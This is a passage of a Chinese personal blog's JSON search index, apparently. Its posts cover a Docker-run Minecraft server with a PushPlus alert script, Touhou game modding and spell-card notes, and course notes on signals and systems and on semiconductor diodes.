docker stop $CONTAINER_NAME ;; restart) # 重启容器 docker restart $CONTAINER_NAME ;; log) # 输出日志 docker logs -f $CONTAINER_NAME ;; sh) # 进入shell docker exec -it $CONTAINER_NAME sh ;; *) # 无效参数 echo &quot;Invalid argument: $1&quot; echo &quot;Usage: $0 run|start|stop|restart|log&quot; exit 2 ;;esac# 打印容器状态docker ps -a | grep $CONTAINER_NAME 同样，保证目录下有一个frpc.ini文件。每次编辑完成后，需要删除原来的容器重新启动一个。 还有一个使用pushplus简单的监控脚本： 12345678910#!/bin/bashtoken=&quot;your_token_here&quot;url=http://www.pushplus.plus/sendbash mc.sh log | grep -E --line-buffered &quot;error|fail|warn&quot; |\\while read line; do json=&quot;{\\&quot;token\\&quot;: \\&quot;$token\\&quot;, \\&quot;title\\&quot;: \\&quot;MC服务端异常报警\\&quot;, \\&quot;content\\&quot;: \\&quot;$line\\&quot;}&quot; curl -H &quot;Content-Type: application/json&quot; -X POST -d &quot;$json&quot; $urldone 它会每次从日志开始读取日志，将报错信息发送给PushPlus API。我一般会在微信上收报警消息。不过每次从日志开始读取日志确实不太好（会重复发送以前的错误信息）。这个回头得改一改。要么每次退出时清空日志，要么设置个读取行指示的全局变量。 就是这样啦。","link":"/2023/06/07/%E6%B8%B8%E6%88%8F/Minecraft/%E7%94%A8Docker%E5%BC%80%E4%B8%AAMC%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"TouhouMix","text":"下载地址：https://dreamweb.lanzoui.com/iBZsypltg9a","link":"/2021/06/14/%E6%B8%B8%E6%88%8F/%E4%B8%9C%E6%96%B9Project/TouhouMix/"},{"title":"【魔改】东方虹龙传（？","text":"一个简单的[[東方Project：同人界永远的奇迹|东方正作]]贴图替换魔改。内容如下： 主界面背景替换 游戏界面边框替换 本来想替换logo的，但是图片尺寸不一样 主界面立绘也是大小不一样，就暂时没换 游戏内立绘回头再换（其实是想把6面boss直接换成纯狐的。。。不过这样的话貌似还是魔改下虹龙洞比较方便（游戏在这里。基本还是没怎么改的状态（）点击下载","link":"/2021/05/15/%E6%B8%B8%E6%88%8F/%E4%B8%9C%E6%96%B9Project/%E3%80%90%E9%AD%94%E6%94%B9%E3%80%91%E4%B8%9C%E6%96%B9%E8%99%B9%E9%BE%99%E4%BC%A0%EF%BC%88%EF%BC%9F/"},{"title":"东方STG魔改日志-1-解包","text":"序言之前，我发过一篇详细注释过的ECL脚本。当时是在做绀珠传的符卡魔改来着……不过已经咕了太久了。这次，我打算从头开始，详细记录一下魔改的相关知识。 关于魔改魔改（modification），也就是mod，指的就是通过技术手段对程序进行修改，从而达到一些目的（比如东方正作STG的魔改，一般都是为了整活XD）。对[[東方Project：同人界永远的奇迹|东方]]的魔改，一般就是玩法拓展，贴图更换，弹幕创新之类的。 能改什么东方正作STG能改的，主要是这几个： 贴图：比如立绘，背景，UI贴图之类的 对话：人物对话，也包括对话时bgm的切换，角色的出现消失之类的 弹幕：也就是boss，道中的弹幕。不光是弹幕，其实整个敌人的行为，都可以修改 机体：包括自机的火力数据，移动速度以及贴图等等。我之前做的那个“强拆地灵殿”其实本质上就是火力数据修改 音乐：不光包括bgm，也包括各种音效（比如擦弹音效，biu~之类的） 大多数魔改都是指上面的内容。当然，有些技术力高的dalao（比如鶸，Priw8，yuke等）也会魔改一些其他的东西。比如把地灵殿的魔B移植到绀珠传里，让画面看起来像滚筒洗衣机一样，让移动对象从自机变成画面等等。不过这些一般难度都比较高，需要用到汇编等知识，门槛也相对比较高。其他的一些，比如换贴图，是最简单的一类魔改。 怎么改说了这么多，到底怎么改呢？以东方地灵殿为例，我就介绍下魔改的大概流程。 魔改对象首先，我们得了解下原作的文件目录结构。 这是东方地灵殿的目录。主要文件只有这几个： custom/custom_c.exe：这是游戏的设置程序。各种高级设置（比如图像质量之类的）都在这里修改。不过并不是核心程序。也就是说，没了它，游戏还能运行。 th11/th11c.dat：我们魔改的核心对象。存储了所有贴图，对话，弹幕脚本，火力数据，音效文件，音乐循环点等关键信息。 th11/th11c.exe：游戏本体。600多K的大小。也是魔改的一个重要对象，不过因为门槛比较高，所以现阶段就不过多介绍了。 thbgm/thbgmogg.dat：游戏音乐。也就是酒鬼写的曲包。这个ogg是因为我为了精简游戏体积（便于传教XD），所以用工具压缩了音乐包的体积（毕竟原体积300+MB，实在太大了）。同时，有了专门修改过的d3d9.dll，这个压缩过的曲包才能被正确识别。也就是说，对于原版游戏，是没有d3d9.dll,曲包也是叫thbgm.dat的。 魔改工具这篇文章，我只介绍怎么解包原作的文件（比如这作就是th11/th11c.dat）。所以用到的工具只有一个：Touhou Toolkit（thtk）。顾名思义，thtk是东方的工具包。详情可以上GitHub看看。 不过注意，这个工具是没有GUI（图形界面）的，只能在命令行里用指令进行操作。所以入门相对而言会麻烦一些。好在有julao写了图形化的re_thtk_gui，便于使用。详情请看这里。 开始 打开工具，左上角菜单里选择正确的版本。在thdat选项组里找到第二行：文件路径。 点击右侧三个点，找到你的游戏目录，打开目录中th11/th11c.dat。 点击解包、获取文件列表，等待执行完毕。 完成后，打开游戏目录。你会看到新增了data文件夹。打开data文件夹，你会看到游戏的大部分资源，包括音效、贴图、ECL弹幕脚本等。 到这里还没有结束。因为只有音效是可以直接用的，其他的还是压缩状态。怎么办？很简单，用工具解包它们！ 以thanm（即贴图）为例。对于后缀为.anm的文件，我们在工具的thanm选项组里找到第二行 和thdat的解包方法一样，点击右侧三个点，进入刚生成的data文件夹中，选择要解包的anm文件 点击解包、获取描述文件，等待完成 完成后，去data目录里看一看，是不是生成了一个ANM文件夹？它就是我们的解包成果。点开里面的目录，就是我们想要的贴图！ 我们可以对贴图进行修改，然后先点击thanm的打包，再点击thdat的打包，生成打包好的th11/th11c.dat。打开游戏，就能看到你的成果了。 比如我一个改贴图的屑作：【魔改】东方虹龙传（？，试图把六面变成纯狐（ 结尾掌握了基本的解包打包技术后，你就能通过替换贴图来实现初等的魔改了。想想能做什么有意思的事吧（","link":"/2021/07/20/%E6%B8%B8%E6%88%8F/%E4%B8%9C%E6%96%B9Project/%E4%B8%9C%E6%96%B9STG%E9%AD%94%E6%94%B9%E6%97%A5%E5%BF%97-1-%E8%A7%A3%E5%8C%85/"},{"title":"东方狗下载站","text":"点击进入","link":"/2021/05/23/%E6%B8%B8%E6%88%8F/%E4%B8%9C%E6%96%B9Project/%E4%B8%9C%E6%96%B9%E7%8B%97%E4%B8%8B%E8%BD%BD%E7%AB%99/"},{"title":"東方Project：同人界永远的奇迹","text":"正作全收录东方旧作整理 点击下载 THBWiki-东方旧作 东方红魔乡 游戏下载点击下载（汉化版-无wav文件） 游戏录像收集暂无（咕 游戏资料THBWiki-东方红魔乡百度百科-东方红魔乡 东方妖妖梦 游戏下载点击下载（汉化+精简） 游戏录像收集暂无（咕 游戏资料THBWiki-东方妖妖梦 百度百科-东方妖妖梦 东方永夜抄 游戏下载点击下载（汉化+精简） 游戏录像收集点击访问。密码：1ztc 游戏资料THBWiki-东方永夜抄 百度百科-东方永夜抄 东方风神录 游戏下载点击下载（汉化+精简） 游戏录像收集暂无（咕 游戏资料THBWiki-东方风神录 百度百科-东方风神录 东方地灵殿 游戏下载原版：点击下载（汉化+精简） 魔改版（红白强拆地灵殿）：点击下载 游戏录像收集暂无（咕 游戏资料THBWiki-东方地灵殿 百度百科-东方地灵殿 东方星莲船 游戏下载点击下载（汉化+精简） 游戏录像收集暂无（咕 游戏资料THBWiki-东方星莲船 百度百科-东方星莲船 东方神灵庙 游戏下载点击下载（汉化+精简） 游戏录像收集暂无（咕 游戏资料THBWiki-东方神灵庙 百度百科-东方神灵庙 东方辉针城 游戏下载点击下载（汉化+精简） 游戏录像收集暂无（咕 游戏资料THBWiki-东方辉针城 百度百科-东方辉针城 东方绀珠传 游戏下载点击下载（汉化+精简） 游戏录像收集暂无（咕 游戏资料THBWiki-东方绀珠传 百度百科-东方绀珠传 正作魔改工具.sht文件编辑工具（在线）点击进入 没搬过来 THTK Web Editor（在线）点击进入 还没做好（","link":"/2020/07/06/%E6%B8%B8%E6%88%8F/%E4%B8%9C%E6%96%B9Project/%E6%9D%B1%E6%96%B9Project%EF%BC%9A%E5%90%8C%E4%BA%BA%E7%95%8C%E6%B0%B8%E8%BF%9C%E7%9A%84%E5%A5%87%E8%BF%B9/"},{"title":"符卡笔记-东方风神录-【风神的神德】","text":"基本信息出现：东方风神录-Hard/Lunatic-Stage-6-终符 使用角色：八阪神奈子 研究分析大概扭了半个多小时吧……开始有意识地去记注意札弹出现的颜色顺序。有6种颜色：红，紫，绿，蓝，浅蓝，？（忘了）。这六种颜色的弹幕形状都比较有规律，比较明显的是红色，每次都相对整齐，基本会排列在一列之内。 稍加注意可发现，红色的子弹在生成的时候，是处于麻将花的最内圈位置。由此再继续观察，可发现每种颜色（每层）的麻将花都由五个花瓣组成。 对每个花瓣进行观察，发现其展开方式类似于东方地灵殿4面道中大蝴蝶所发射的札弹（都是先展开成弧形，再反向发射）。只不过它是多层开花弹，而该符是单层开花长条札弹（？）。 开花弹，顾名思义，就是像开花一样，以一个点为圆心，每隔一定角度，发射一个子弹。因为它看起来很像开花，故称为开花弹。 再作观察和尝试可发现，该符卡的正常（排除某些触手）避弹区域仅限于版下方四分之一不到的区域。 以红色的那圈麻将花为研究对象。我们能发现，五个花瓣的排列方式类似于正放的五角星。所以真正对自机有威胁的花瓣，就是正上方的三瓣。 我们分析下它的运动轨迹。 首先，以麻将老太婆（不是）为中心长出（红色的）一层麻将花，随后每个花瓣上所有的札弹，以其所在的圆弧的圆心为中心，做向心匀速（目测）直线运动。这一过程可以近似认为是花瓣所在的圆弧以其本身所在的圆的圆心作平滑的中心对称变换。 所以，得出初步结论：自机所面对的一堆红色麻将（？），实际上是三个固定位置圆弧交叉叠加所形成的，看似随机的（貌似）固定弹。 再作类比。这个符卡实际上和飞钵（东方星莲船六面终符）是比较类似的，都是由圆弧叠加所形成，不过这个符的圆弧上的札弹（麻将）更加密一些。 避弹思路这个符的避弹，从整体上来说，可以分成前半阶段和后半阶段。 前半阶段：似乎这会的弹幕强度相对比较低一些，随便扭就行。因为弹幕由圆弧叠加而成，所以避弹思路类似于交叉弹。注意视野适当上移即可。 后半阶段：到这里，这张符卡的血量基本就剩下一半左右了（满火力情况下）。此时符卡难度会有较大提升，具体的有弹幕速度变快，麻将花发弹间隔缩短。因此更容易出现封位弹。这里就有一定的看脸成分了。首先一定要做好预判，全局把握，视野不能放的太低；其次高低速切换一定要提前做，不然很容易撞；还有，遇到小缝要看准了钻，此处需要很好的底力；最后多洗脸，别脸太黑了（不是） 总结交叉弹很能训练底力，高低切很考验预判和反应能力，钻小缝考验心态和信心。总而言之，个人认为适合用于提升底力的练习。","link":"/2021/07/26/%E6%B8%B8%E6%88%8F/%E4%B8%9C%E6%96%B9Project/%E7%AC%A6%E5%8D%A1%E7%AC%94%E8%AE%B0-%E4%B8%9C%E6%96%B9%E9%A3%8E%E7%A5%9E%E5%BD%95-%E3%80%90%E9%A3%8E%E7%A5%9E%E7%9A%84%E7%A5%9E%E5%BE%B7%E3%80%91/"},{"title":"魔改笔记：ECL符卡结构详解","text":"这里先贴上一段注释过的符卡脚本 其实这就是纯狐一符，没想到吧？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148sub BossCard1(){var A B C D E F G H; //定义变量unless([-9986] == 0) goto BossCard1_160 0; //判断是否全避，若不是0则是全避ins_615(640.0f); //消掉半径为r范围内的弹幕,消掉的弹幕变为最大得点goto BossCard1_180 0;BossCard1_160:ins_616(640.0f); //消掉半径为r范围内的弹幕,不增加得点BossCard1_180:2 : ins_524(63); // 设置章节数,影响即将出现的符卡立绘,背景以及左上角boss的名字4 : ins_569(1); //用来设置击破率ins_11(&quot;BossItemCard&quot;); //调用该函数，猜测为符卡相关设置ins_513(); //重置时间ins_21(); //关闭所有子线程ins_525(); //清除所有单位，有某些flag的不会被清除.unless([-9986] == 0) goto BossCard1_428 4; //判断是否全避，若不是0则是全避ins_615(640.0f); //消掉半径为r范围内的弹幕,消掉的弹幕变为最大得点goto BossCard1_448 4;BossCard1_428:ins_616(640.0f); //消掉半径为r范围内的弹幕,不增加得点BossCard1_448:ins_523(); //结束符卡模式ins_632(0); //boss每身重置为0，有些特殊攻击模式时启用ins_545(); //重置boss一些参数ins_516(27); //播放音效ins_404(0.0f, 0.0f); //设置移动方向以及速度ins_405(0, 0, 0.0f, 0.0f); //改变移动方式:时间，模式（线性），方向，速度ins_401(0, 0, 0.0f, 0.0f); //移动到：时间，模式，x，y[-9949] = 0; //已miss数，每个章节结束时重置为0[-9948] = 0; //已放的b的数量[-9947] = 1; //判断上1符卡是否收取，收则是1ins_514(0, 0, 3300, &quot;Boss2&quot;); //载入下一阶段：a，血量，时间，阶段变量名!ENins_537(78, 3300, 500000, &quot;「掌の純光」&quot;);!Hins_537(78, 3300, 500000, &quot;「掌の純光」&quot;);!Lins_537(78, 3300, 500000, &quot;「掌の純光」&quot;);!*ins_401(60, 4, 0.0f, 128.0f); //移动到：时间，模式，x，yins_504(0.0f, 128.0f, 240.0f, 224.0f); //限制boss移动范围：x,y为基准，+-n和m的范围ins_307(1, 79); //播放ANM文件a的第b个动画效果ins_307(1, 75); //播放ANM文件a的第b个动画效果ins_516(54); //播放音效94 : ins_0(); //94帧后调用： 空指令，main开始调用一次ins_23(60); //等待60帧$A = 120;$E = 3;$F = 10000; //$X为整数变量名，%X为浮点数变量名goto BossCard1_2136 94;BossCard1_1224:ins_302(3); //选择ANM文件ins_316(0, 0); //未知$G = 3;goto BossCard1_1388 94;BossCard1_1332:ins_11(&quot;BossCard1_at2&quot;); //调用该函数ins_23(100); //等待100帧BossCard1_1388:if $G-- goto BossCard1_1332 94;ins_23(60); //等待60帧ins_307(1, 79);ins_307(1, 75); //播放ANM文件a的第b个动画效果ins_516(54); //播放音效ins_302(3); //选择ANM文件ins_306(0, 0); //在slot=0上,设置单位贴图=0ins_23(60); //等待60帧ins_302(3); //选择ANM文件ins_316(0, 0); //未知% D = [-9998.0f]; //[-9998.0f]=-π至π之间的随机浮点数$H = $E;goto BossCard1_1872 94;BossCard1_1732:ins_11(&quot;BossCard1_at2&quot;, _ff % D); //调用该符第二阶段% D = (% D + 3.883222f); //%D自增3.883222fins_23(10); //等待10帧BossCard1_1872:if$H-- goto BossCard1_1732 94;unless($E &lt; 4) goto BossCard1_2072 94;$E = ($E + 1); //%D自增1BossCard1_2072:ins_23(60); //等待60帧ins_306(0, 0); //在slot=0上,设置单位贴图=0ins_23(70); //等待60帧BossCard1_2136:if$F-- goto BossCard1_1224 94;goto BossCard1_2224 94;BossCard1_2204:ins_23(1000); //等待1000帧BossCard1_2224:if1 goto BossCard1_2204 94;ins_10(); //返回到调用这个过程的地方，不清除当前单位} sub BossCard1_at(){var A;ins_600(0); //创建编号=0的弹幕ins_607(0, 3); //设置id=0弹幕的效果=3ins_602(0, 5, 6); //设置弹幕贴图!E 48;!N 96;!H 108;!LO 112;!* //[-1]：指向当前堆栈顶的整数ins_606(0, [-1], 1); //设置弹幕的方向数和层数ins_604(0, 0.0f, 0.0f); //设置弹幕方向为0.0f，每个方向的角度差为rins_605(0, 0.5f, 0.2f); //设置弹幕速度为0.5f，最慢一层为0.2fins_611(0, 0, 2, 1, -999999, -999999.0f, -999999.0f); //弹幕变换ins_611(0, 0, 1048576, 1, -999999, -999999.0f, -999999.0f); //弹幕变换ins_611(0, 0, -2147483648, 30, -999999, -999999.0f, -999999.0f); //弹幕变换ins_611(0, 0, 2097152, 30, -999999, 4.0f, -999999.0f); //弹幕变换ins_627(0, 24.0f); //设置id=0弹幕的发弹点：以boss为中心，半径为24.0fins_614(1, 0); //复制弹幕b到a中ins_610(1, 4, 0, 134217728, 0, 8, 6, 1, -999999.0f, 0.0f, 16.0f, 128.0f); //弹幕变换ins_610(1, 5, 0, 16384, 18, 38, 8, 0, 0.0f, 14.0f, 0.0f, 0.0f); //弹幕变换ins_609(1, 8, 0, 4, 90, -999999, 0.05f, -999999.0f); //弹幕变换ins_609(0, 4, 0, -2147483648, 15, -999999, -999999.0f, -999999.0f); //弹幕变换ins_609(0, 5, 0, 2097152, 30, -999999, 0.7f, -999999.0f); //弹幕变换% A = [-9998.0f]; //[-9998.0f]=-π至π之间的随机浮点数ins_604(0, % A, 0.0f); //设置弹幕方向为%A，每个方向的角度差为rins_601(0); //发射弹幕id=0ins_607(1, 5); //设置id=1弹幕的效果=5（开花）ins_604(1, % A, 0.0f); //设置弹幕方向为%A，每个方向的角度差为rins_601(1); //发射弹幕id=1ins_10();}sub BossCard1_at2(A){var B;BossCard1_at2_36:ins_600(0); //创建弹幕id=0ins_607(0, 1); //设置id=0弹幕的效果=1（普通）ins_602(0, 8, 6); //设置弹幕贴图ins_606(0, 1, 1); //设置弹幕的方向数和层数ins_604(0, 1.5707964f, 0.0f); //设置弹幕方向为1.57，每个方向的角度差为0.0fins_605(0, 6.0f, 1.0f); //设置弹幕速度为6.0f，最慢一层为1.0fins_608(0, 21, -1); //设置发弹音效21，设置变向音效-1（无音效）ins_611(0, 0, 4, 8, 0, 5, 1.5707964f); //弹幕变换：0，通道，mode，a，b，r，sins_628(0, _f(([-9987.0f] * _f(200)) + _f(0)), _f([-9999.0f] * _f(32))); //设置id=0弹幕发弹基准点x，yins_601(0); //发射id=0弹幕ins_23(1); //等待1帧goto BossCard1_at2_36 0;ins_10(); //退出子进程}","link":"/2020/12/21/%E6%B8%B8%E6%88%8F/%E4%B8%9C%E6%96%B9Project/%E9%AD%94%E6%94%B9%E7%AC%94%E8%AE%B0%EF%BC%9AECL%E7%AC%A6%E5%8D%A1%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/"},{"title":"信号与系统笔记","text":"考核：平时成绩 30%阶段考核 10%慕课考核 10%期末考试 50% 1-信号与系统1.1-信号与系统的概念信号 是信息的载体 系统 是若干事物组成的功能性整体，其基本作用是对信号进行传输和处理。输入信号（激励），系统产生输出（响应）。 信号处理 对信号加工处理，去除无关信息。 通信过程分为两种，有线和无线。 1.2-信号的描述描述信号是信息的一种物理体现，一般是随时间或位置变化的物理量。可以分为电信号和非电信号。二者可以相互转换。 描述方式有函数和波形描述。 分类按照实际用途可以分为电视，雷达，控制信号等等 按照所具有的时间特性划分： 确定信号和随机信号 能否用确定的时间函数表示的信号。 连续信号和离散信号 连续的时间范围内是否有定义的信号。 连续信号和离散信号分别可以对应模拟信号（时间和幅值均连续的信号）和数字信号。信号传输时通常采用数字信号的形式传输，在系统中使用时会重新解码为模拟信号。模拟转数字过程：先抽样，转化为抽样信号（时间离散，幅值连续的信号）；再量化，转化为幅值和时间均为离散的信号（把一个区间内的值都映射为一个值），随后将信号进行编码再发射出去。![[Pasted image 20221220093016.png]] 周期信号和非周期信号 定义域在$(-\\infty, +\\infty)$间，每隔$T$重复的信号。 判断两个周期信号的和信号是否为周期信号 设两信号周期分别为$T_1,T_2$，若$\\frac{T_1}{T_2}$为有理数，则和信号是周期信号，且周期为$T_1,T_2$的最小公倍数。 正弦信号一定是周期信号，其和则不一定。 判断$f(k)=sin(\\beta k)$是否为周期信号 ![[Pasted image 20221220094043.png]] 上面的$\\beta$称为数字角频率，这意味着把信号离散化了。正弦序列不一定是周期序列，两个周期序列之和一定是周期序列。 能量信号与功率信号 信号瞬时功率 将信号$f(t)$施加到$1\\Omega$的电阻上，其瞬时功率为$\\vert{f(t)}\\vert^2$。能量和平均功率的定义为： $$E=\\int \\vert{f(t)}\\vert^2 dt$$$$P=lim_{t \\to \\infty}\\frac{1}{T}\\int_{-\\frac{T}{2}}^{\\frac{T}{2}}\\vert{f(t)}\\vert^2 dt$$ 若能量有界，则称为能量有限信号/能量信号。此时$P=0$；若功率有界，则称为功率有限信号/功率信号，此时$E=\\infty$。 对于离散信号也一样，将积分改为求和即可：![[Pasted image 20221220095410.png]] 一维信号和多维信号 如音频信号/图像信号 因果信号与反因果信号 $t&lt;0,f(t)=0$即因果信号，$t\\geq 0, f(t)=0$ 称为反因果信号 确定性信号 指数信号$f(t)=Ke^{\\alpha t}$ 若只保留$t\\geq 0$的部分则称为单边信号 正弦信号$f(t)=Ksin(\\omega t+\\theta)$ 在前面乘一个衰减的指数信号则称为衰减正弦信号 复指数信号 把指数信号的$\\alpha$换为$s=\\sigma +j\\omega$，即复数，这称为复频率![[Pasted image 20221220100315.png]] 抽样信号$Sa(t)=\\frac{sin t}{t}$，向两侧衰减的余弦信号![[Pasted image 20221220100538.png]] 1.3-信号的基本运算加法和乘法 连续信号：函数相加/乘 离散信号：对应各离散量相加/乘 信号的时间变换 反转：将 $f(t)\\to f(-t)$ ，$f(k)\\to f(-k)$ 称为对信号$f(\\cdot)$的反转或反折。从图形上看是将$f(\\cdot)$以纵坐标为轴反转$180^o$： 平移：将 $f (t) → f (t – t_0)$ ， $f (k) → f (k – k_0)$称为对信号$f (·)$的平移或移位。若$t_0$ (或$k_0$) $&gt;0$，则将$f (·)$右移；否则左移 展缩：将 $f (t) → f (at)$ ， 称为对信号$f(t)$的尺度变换。若$a &gt;1$ ，则波形沿横坐标压缩；若$0&lt; a &lt; 1$ ，则扩展： 组合变换原图进行变换： 变换得到原图： 1.4-阶跃函数和冲激函数这俩是奇异函数（函数本身有不连续点(跳变点) 或 其导数与积分有不连续点 的一类函数） 阶跃函数函数如下：$\\epsilon(t)=0:x&lt;=0;1,x&gt;0$ 单位冲激函数 函数值只在t = 0时不为零 积分面积为1 $t=0$时，$\\delta(t)\\to \\infty$，为无界函数 对$\\epsilon(t)$求导即可得到单位冲激函数$\\delta(t)$。它高度无穷高，厚度无穷窄，面积为1。反过来，对单位冲激函数积分就可以得到$\\epsilon(t)$。 它有如下重要性质： 取样性： 例如： $sin(t+\\frac{\\pi}{4})\\delta(t)=sin(\\frac{\\pi}{4})\\delta(t)=\\frac{\\sqrt{2}}{2}$ $\\int_{-\\infty}^{\\infty}{sin(t-\\frac{\\pi}{4})\\delta(t)}=-\\frac{\\sqrt{2}}{2}$ 冲激偶： 尺度变换： 2-连续系统的时域分析2.1-LTI连续系统的响应 微分方程的经典解 步骤相对固定： 先计算通解，再计算特解，随后回代特解和激励，得到特解的系数；最后回代，利用初始条件得到方程的未知系数。 计算通解：就是方程对应齐次微分方程的解。得到特征根后即可写出通解 计算特解：根据激励的形态确定特解形式。激励形式有指数、幂级数、三角函数三种形式，以及冲激函数。前三种有固定的特解形式 回代得到特解系数：就是回代，然后化简，就能得到特解系数 得到全解：通解=齐次解+特解。最后代入初始条件得到通解的系数，即可得到全解 关于$0_-$和$0_+$值 零输入响应 零状态响应 全响应 一般情况下，根据换路定律，二者应该是相等的。但是当激励中含有冲激函数及其导数时，$t=0$激励接入系统时，响应及其导数就可能发生跃变。这种情情况下，就需要手工计算二者。通常有两种方法：积分法和待定系数法。 2.2-冲激响应和阶跃响应2.3-零状态响应与卷积积分根据LTI系统的线性性质、齐次性质、时不变性质可以得到，任意激励$f(t)$的响应$y_{zs}(t)$为： $$y_{zs}(t)=\\int_{-\\infty}^{\\infty}{}f(\\tau)h(t-\\tau)d\\tau=f(t)*h(t)$$ 从直观上看，这相当于：$f(t)$引发的响应等于所有构成它的冲激函数单独作用引起的响应之和。 从而，计算LTI系统响应就可以直接用卷积积分计算，无需求解经典微分方程。一般步骤： 求$h(t)$：这一步就是求解微分方程，得到系统响应 求$y_{zs}(t)$：直接用任意激励$f(t)$卷上系统响应$h(t)$就能得到零状态响应$y_{zs}(t)$ 2.4-卷积积分定义：一般而言，有两个定义在实数域上的函数$f_1(t)$和$f_2(t)$，它们的卷积积分定义为： $$f(t)=f_1(t)*f_2(t)=\\int_{-\\infty}^{\\infty}{f_1(\\tau)f_2(t-\\tau)d\\tau}$$ 计算方法也很多，比如图解法：已知二者波形时，先换元，将$t$换为$\\tau$；再将$f_2(\\tau)$变换为$f_2(t-\\tau)$；随后将二者相乘，最后将乘积对$\\tau$积分。注意，这里对乘积积分时，需要注意到$t$是个不确定的变量，应该分区间讨论。 性质：首先是代数运算，它满足 交换律 分配律 结合律 其次，是函数和冲激函数的卷积，这是最简单的一种情况。有以下结论： $$f(t)*\\delta(t)=\\delta(t)*f(t)=\\int_{-\\infty}^{\\infty}{\\delta(\\tau)f(t-\\tau)d\\tau}=f(t)$$ 也就是任意函数卷上$\\delta(t)$得到它本身。推广得： $$f(t)*\\delta(t-t_0)=\\delta(t-t_0)*f(t)=f(t-t_0)$$ 还可以得到： $$f_1(t-t_1)*f_2(t-t_2)=f_1(t-t_2)*f_2(t-t_1)=f_1(t)*f_2(t)*\\delta(t-t_1-t_2)$$ 此外，还有：$f(t)*\\delta’(t)=f’(t)$成立 3-离散系统的时域分析4-傅里叶变换和系统的频域分析","link":"/2022/12/20/%E7%89%A9%E7%90%86/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"},{"title":"模电：第一章-半导体器件","text":"1.1 半导体基础 P/N型半导体 根据载流子的正负电性命名，掺杂三价/五价物质 本征半导体 纯度达到小数点后9个9的半导体。在其中，空穴数和自由电子数相等 掺杂 会使某一种载流子占多数 漂移运动 载流子在电场作用下定向运动 扩散运动 载流子自浓度高向低浓度区域扩散 1.2 PN结PN结形成过程在一块本征半导体两侧进行N型掺杂和P型掺杂，此时在结合面上会发生扩散运动。N电子扩散到P空穴，两区域会中和，从而在结合面上会形成裸露粒子。P区呈负电性，N区呈正电性。这会形成内电场，由N区指向P区。这电场会阻碍多子的扩散作用。 在内电场作用下，少子会漂移，方向盘和扩散方向相反，从而会和多子达到动态平衡。平衡后的空间电场区域就称为PN结。这也称为耗尽层（缺少多子），也等效于电阻。 两边掺杂程度不同，会使得PN结不对称。重掺杂一侧会因为密度大相对薄。用P+N/PN+表示。 PN结单向导电性正偏（P流向N）导通，反偏（N流向P）截止。 P区电位高于N区电位称为正偏（forward bias），反之称为反偏。 这回路必须加上限流电阻，否则无压降时电流会很大，二极管会被烧毁。 导通性主要和内电场有关。漂移电流大则电流小，扩散电流大则电流大。温度升高漂移电流也会增大。10℃大概对应漂移电流变化一倍。反向电流由于基本不变，所以称为反向饱和电流。 伏安特性伏安特性数学关系为：$I_D=I_S(e^{\\frac{u}{U_t}}-1)$，其中只有$U$和$I$是变量，$I_S$是反偏电流，$U_T$是温度当量，默认为$26mV$。 $U_T=\\frac{kT}{q}$，其中的$k$是玻尔兹曼常数。 $T=300$时，电压为$26mV$。 ![[Screenshot_20221229_093211.jpg]] 击穿特性击穿方式有两种，血崩击穿和齐纳击穿。 雪崩击穿 当PN结较厚，电压较高时，一个载流子打在PN结上，会撞出来一些自由电子。这些自由电子会像链式反应一样撞出来更多的自由电子。 齐纳击穿 当PN结较薄，电压较低时，内部扩散载流子形成的内电场可能会直接把束缚电子拉出来，形成击穿。 ![[Screenshot_20221229_094116.jpg]] ![[Screenshot_20221229_094218.jpg]] PN结的电容效应 总而言之，PN结可以等效为电容和电阻并联。 电容效应 电压变化引起电荷变化。势垒电容，扩散电容构成了PN结的电容效应。 势垒电容 由阻挡层内电荷引起。外加电压会改变阻挡层厚度。这会使得阻挡层内电荷量改变。 扩散电容 多子扩散后，在另一侧积累形成电容效应。正向电压会改变电荷量从而使得电容改变。 ![[Screenshot_20221229_100028.jpg]] 1.3 半导体二极管是将半导体制作成二极管（diode）得到的电子元件，性质也是单向导通。两端分别为P端（阳极），N端（阴极）。 分类可以按照材料： 硅二极管 锗二极管 也可以按照结构分类： 点接触型二极管 适合高频工作，小电流整流、检波和混频等 面接触型二极管 只能在较低的频率工作，可用于整流电路 硅平面型二极管 结面积大的用于大功率整流，小的在脉冲数字电路中作开关管 二极管的参数二极管有这么几个特殊点。考虑U-I图（横轴U纵轴I），有 $U_{th}$ 死区电压，超过这个正值二极管开始导通 $U_{on}\\text{ or }U_I$ 导通电压，此时电流达到1mA $U_{BR}$ 击穿电压，反向电压超过一定值后，反向电流急剧增加 $U_R$ 最大反向工作电压，二极管允许的最大工作电压，一般取最大值的一半标注 $I_F$ 最大整流电流，正向最大平均电流 $I_R$ 反向电流，未击穿时反向电流值，受温度影响大 $f_M$ 最高工作频率 和结电容成反比 $R_D$ 端电压和流过二极管的电流之比 $r_d$ 交流电阻，工作点附近的图像切线斜率倒数。取26℃室温，约为$\\frac{26(mV)}{I_{DQ}}$，分母是工作点的电流 部分重要参数如下： - 硅二极管 锗二极管 $U_{th}$ 0.5V 0.1V $U_{on}$ 0.7V 0.3V 反向饱和电流 $nA$ $\\mu A$ 温度特性 温度升高1℃，正向压降减小2-2.5mV；升高10℃，反向电流约增大1倍。 为了简化分析，可以在某种范围用线性函数近似二极管的指数分布。 理想模型 就是理想二极管，反向断路，正向短路 恒压降模型 在理想模型基础加上$U_{on}$，相当于将理想模型向右平移$U_{on}$ 折线模型 把前者正向短路换成斜率$1/R_D$的直线 利用二极管反向电流变化小的性质，可以用它制作稳压电路。 限幅电路限幅电路是一种常用的保护电路，可以限制输入信号的幅值，使其不超过一定范围。常用的限幅电路有正向限幅电路和反向限幅电路。 限幅的实现，是源于二极管的伏安特性曲线。它导通时，两端电压近似等于二极管的导通电压。这使得二极管有了一种“钳制”的效果：当二极管在一个支路上，如果遇到一个支路的端电压超过导通电压，则二极管会导通，使得两端的电压无限接近于二极管的导通电压。 下面是另一个题型，看谁先导通（共极）。这种方法看谁的阴极电压更低，就能得出了。 